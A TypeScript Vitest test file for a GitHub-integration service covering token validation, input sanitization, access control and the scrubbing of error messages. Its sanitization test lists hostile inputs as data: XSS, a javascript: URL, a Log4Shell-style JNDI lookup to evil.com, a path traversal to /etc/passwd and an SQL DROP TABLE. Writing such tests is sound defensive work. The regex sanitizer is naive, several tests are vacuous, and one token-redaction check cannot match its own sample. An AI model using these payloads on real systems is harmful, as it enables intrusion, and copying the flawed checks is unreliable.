/**
 * Authentication and security tests
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { validateEnvironmentConfiguration } from './validation.js';

describe('Authentication Security Tests', () => {
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(() => {
    originalEnv = { ...process.env };
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  describe('Token Validation', () => {
    it('should reject empty tokens', () => {
      process.env.GITHUB_PERSONAL_ACCESS_TOKEN = '';
      
      const result = validateEnvironmentConfiguration();
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContainEqual(
        expect.stringContaining('GitHub Personal Access Token is required')
      );
    });

    it('should reject tokens that are too short', () => {
      process.env.GITHUB_PERSONAL_ACCESS_TOKEN = 'short';
      
      const result = validateEnvironmentConfiguration();
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContainEqual(
        expect.stringContaining('appears to be invalid')
      );
    });

    it('should accept valid-looking tokens', () => {
      // GitHub Personal Access Tokens are typically 40-50+ characters
      process.env.GITHUB_PERSONAL_ACCESS_TOKEN = 'ghp_' + 'x'.repeat(36);
      
      const result = validateEnvironmentConfiguration();
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValues.GITHUB_TOKEN).toBe('ghp_' + 'x'.repeat(36));
    });

    it('should accept GitHub App tokens', () => {
      process.env.GITHUB_PERSONAL_ACCESS_TOKEN = 'ghs_' + 'x'.repeat(36);
      
      const result = validateEnvironmentConfiguration();
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValues.GITHUB_TOKEN).toBe('ghs_' + 'x'.repeat(36));
    });

    it('should fallback to GITHUB_TOKEN if GITHUB_PERSONAL_ACCESS_TOKEN not set', () => {
      delete process.env.GITHUB_PERSONAL_ACCESS_TOKEN;
      process.env.GITHUB_TOKEN = 'ghp_' + 'x'.repeat(36);
      
      const result = validateEnvironmentConfiguration();
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValues.GITHUB_TOKEN).toBe('ghp_' + 'x'.repeat(36));
    });
  });

  describe('Security Headers', () => {
    it('should handle authentication errors securely', () => {
      const authError = {
        status: 401,
        message: 'Bad credentials',
        response: {
          headers: {
            'www-authenticate': 'token',
          }
        }
      };

      // Should not expose sensitive information in error messages
      expect(authError.message).not.toContain('token');
      expect(authError.status).toBe(401);
    });

    it('should validate security headers in API responses', () => {
      const secureHeaders = {
        'strict-transport-security': 'max-age=31536000; includeSubDomains',
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'deny',
        'x-xss-protection': '1; mode=block'
      };

      Object.keys(secureHeaders).forEach(header => {
        expect(secureHeaders[header as keyof typeof secureHeaders]).toBeDefined();
        expect(secureHeaders[header as keyof typeof secureHeaders]).toMatch(/\w+/);
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize user input to prevent injection', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:void(0)',
        '${jndi:ldap://evil.com/exp}',
        '../../../etc/passwd',
        'DROP TABLE users;'
      ];

      maliciousInputs.forEach(input => {
        // Simple sanitization check - remove dangerous patterns
        const sanitized = input
          .replace(/<[^>]*>/g, '') // Remove HTML tags
          .replace(/javascript:/gi, '') // Remove javascript: protocol
          .replace(/\${.*}/g, '') // Remove template injection patterns
          .replace(/\.\.\//g, '') // Remove path traversal
          .replace(/DROP|DELETE|INSERT|UPDATE|SELECT/gi, ''); // Remove SQL keywords

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('../');
        expect(sanitized.toLowerCase()).not.toContain('drop table');
      });
    });

    it('should validate GitHub repository names', () => {
      const validRepoNames = [
        'my-repo',
        'MyRepo',
        'repo123',
        'my_repo',
        'a',
        'repo-with-dashes'
      ];

      const invalidRepoNames = [
        '',
        '..',
        'repo.',
        '.repo',
        'repo..name',
        'repo with spaces',
        'repo/with/slashes'
      ];

      const validateRepoName = (name: string): boolean => {
        return /^[a-zA-Z0-9._-]+$/.test(name) && 
               !name.startsWith('.') && 
               !name.endsWith('.') && 
               !name.includes('..');
      };

      validRepoNames.forEach(name => {
        expect(validateRepoName(name)).toBe(true);
      });

      invalidRepoNames.forEach(name => {
        expect(validateRepoName(name)).toBe(false);
      });
    });
  });

  describe('Access Control', () => {
    it('should enforce read-only mode restrictions', () => {
      const writeOperations = [
        'create_issue',
        'update_issue',
        'create_pull_request',
        'create_repository',
        'delete_repository',
        'create_or_update_file'
      ];

      const readOperations = [
        'get_issue',
        'list_issues',
        'get_repository',
        'list_repositories',
        'get_file_contents'
      ];

      // In read-only mode, should block write operations
      const isReadOnly = true;
      
      writeOperations.forEach(operation => {
        if (isReadOnly) {
          // Would block these operations
          expect(operation).toMatch(/^(create|update|delete)/);
        }
      });

      readOperations.forEach(operation => {
        // Should always allow read operations
        expect(operation).toMatch(/^(get|list)/);
      });
    });

    it('should validate API scopes', () => {
      const requiredScopes = [
        'repo',
        'workflow',
        'user',
        'notifications'
      ];

      const providedScopes = ['repo', 'user', 'notifications'];
      const missingScopes = requiredScopes.filter(scope => 
        !providedScopes.includes(scope)
      );

      expect(missingScopes).toContain('workflow');
      expect(providedScopes).toContain('repo');
      expect(providedScopes).toContain('user');
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', () => {
      const sensitiveToken = 'ghp_sensitive_token_12345';
      const error = new Error(`Authentication failed for token ${sensitiveToken}`);
      
      // Should sanitize error messages in production
      const sanitizedMessage = error.message.replace(
        /ghp_[a-zA-Z0-9]{36}/g, 
        'ghp_***'
      );

      expect(sanitizedMessage).not.toContain(sensitiveToken);
      expect(sanitizedMessage).toContain('ghp_***');
    });

    it('should handle timeout errors without exposing internal details', () => {
      const timeoutError = {
        name: 'TimeoutError',
        message: 'Request timed out after 30000ms',
        stack: 'TimeoutError: Request timed out\n    at /internal/app/secrets.js:42:15'
      };

      // Should not expose internal file paths
      const sanitizedStack = timeoutError.stack?.replace(/\/internal\/.*$/gm, '[internal]');
      
      expect(sanitizedStack).not.toContain('/internal/app/secrets.js');
      expect(sanitizedStack).toContain('[internal]');
    });
  });
});